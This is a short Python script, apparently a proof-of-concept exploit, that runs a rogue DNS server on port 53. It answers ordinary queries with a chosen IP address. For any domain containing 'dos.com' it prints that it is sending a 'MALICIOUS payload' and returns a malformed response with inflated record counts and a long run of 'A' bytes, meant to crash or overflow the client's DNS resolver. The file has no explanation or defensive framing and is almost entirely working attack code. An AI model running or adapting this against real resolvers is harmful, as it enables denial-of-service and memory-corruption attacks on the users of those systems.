
import socket, struct, sys
def dw(x): return struct.pack('>H', x)
class DNSQuery:
    def __init__(self, data):
        self.data=data; self.domain=''
        tipo = (ord(data[2]) >> 3) & 15
        if tipo == 0:
            ini=12; lon=ord(data[ini])
            while lon != 0:
                self.domain+=data[ini+1:ini+lon+1]+'.'; ini+=lon+1; lon=ord(data[ini])
    def response(self, ip):
        packet=''
        if self.domain:
            if 'dos.com' not in self.domain:
                packet+=self.data[:2] + "\x81\x80"; packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'; packet+=self.data[12:]; packet+='\xc0\x0c'; packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'; packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
            else:
                print ">>> Sending MALICIOUS payload for dos.com"
                packet = self.data[:2] + "\x81\x80"; packet += dw(1); packet += dw(0x52); packet += dw(0); packet += dw(0)
                packet += ('\x01X\x00' + '\x00\x01' + '\x00\x01' + '\xc0\x0d' + b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
        return packet
if __name__ == '__main__':
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); udps.bind(('', 53))
    try:
        while 1:
            data, addr = udps.recvfrom(1024); p = DNSQuery(data)
            udps.sendto(p.response(sys.argv[1]), addr)
    except KeyboardInterrupt: print 'Terminating'; udps.close()
